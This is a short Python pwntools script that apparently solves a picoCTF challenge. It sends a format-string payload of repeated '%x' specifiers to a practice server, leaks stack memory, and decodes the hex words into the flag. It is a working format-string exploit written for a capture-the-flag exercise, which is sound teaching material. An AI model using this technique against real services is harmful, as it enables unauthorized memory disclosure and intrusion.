from pwn import *

HOST, PORT = "wily-courier.picoctf.net 57069".split()
p = remote(HOST, PORT)

p.sendline(b'1')
p.sendline(b'%x-' * 300)
p.recvuntil(b':\n')
stack = p.recvline().decode().split('-')[:-1]

flag = ""
for val in stack:
    if len(val) == 8:
        for i in range(len(val) - 2, -2, -2):
            char = val[i] + val[i + 1]
            flag += chr(int(char, 16))

print(flag)
p.interactive()

